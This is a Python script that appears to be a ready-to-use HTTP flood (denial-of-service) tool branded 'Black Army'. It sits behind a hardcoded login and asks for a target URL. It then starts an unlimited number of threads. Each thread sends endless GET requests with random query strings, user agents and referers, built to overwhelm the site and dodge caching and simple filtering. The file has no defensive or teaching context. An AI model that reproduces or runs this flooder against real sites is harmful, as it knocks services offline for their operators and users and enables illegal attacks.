#!usr/bin/python3.11
import os
import time
import requests
import threading
import datetime
import sys
import random
import string
import colorama

# Colors
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    
if os.name == 'nt':
    os.system("cls")
else:
    os.system("clear")

os.system("\033[33mhttps://github.com/abatatsa99/")
print("\033[32m<<————————————————— MEDAN JUANG BLACK ARMY —————————————————>>\033[0m")
time.sleep(5)
print("Loading.......")

attemps = 0
os.system("clear")
print("""
\033[31m║\033[36m
\033[31m║\033[36m  ╔══════╗
\033[31m║\033[36m█████╗
\033[31m║\033[36m█╔═══╝
\033[31m║\033[36m█║
\033[31m║\033[36m█║
\033[31m║\033[36m█████
\033[31m║\033[36m╚══╗█
\033[31m║\033[36m     ║█
\033[31m║\033[36m█████    
\033[31m║\033[36m╚════╝  
\033[31m║\033[36m
\033[31m║\033[36m  
\033[97mwhite
\033[31mred
\033[33myellow
\033[34mblue
\033[35m'agenta
\033[36m'cyan
""")

while attemps < 100:
    username = input("\033[32mEnter your username: \033[0m")
    password = input("\033[32mEnter your password: \033[0m")

    if username == 'srk313' and password == 'srk313':
        print("\033[32m⟩⟩SRIKANDI BLACK ARMY\033[0m")
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue

url = input("\033[96mURL:  \033[0m").strip()
u = int(0)
headers = []
referer = [
    "https://github.com",
    "https://google.it",
    "https://alibaba.com",
    "https://google.com",
    "https://youtube.com",
    ]

def useragent():
    global headers
    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15")
    return headers


def genstr(size):
    out_str = ''

    for _ in range(0, size):
        code = random.randint(65, 90)
        out_str += chr(code)
    
    return out_str


class httpth1(threading.Thread):
    def run(self):
        global u
        while True:
            try:
                headers={'User-Agent' : random.choice(useragent()), 'Referer' : random.choice(referer)}
                randomized_url = url + "?" + genstr(random.randint(3, 10))
                requests.get(randomized_url, headers=headers)
                u += 1
                print(f"\033[35m[] \033[96mSRIKANDI-313  \033[31mSent to  \033[95m••>   \033[97m[" +str(url)+ "]\033[0m")
            except requests.exceptions.ConnectionError:
                print(f"\033[97m[] \033[102mSRIKANDI-313  \033[31mSent to ••>   \033[33m[" +str(url)+ "]\033[0m")

                pass
            except requests.exceptions.InvalidSchema:
                print ("\033[38;5;154  Request time out")
                raise SystemExit()
            except ValueError:
                print ("\033[38;5;242m  Check Your URL]")
                raise SystemExit()
            except KeyboardInterrupt:
                print("[Canceled by User]")
                raise SystemExit()


while True:
    try:
        th1 = httpth1()
        th1.start()
    except Exception:
        pass
    except KeyboardInterrupt:
        exit("[Canceled By User]")
        raise SystemExit()














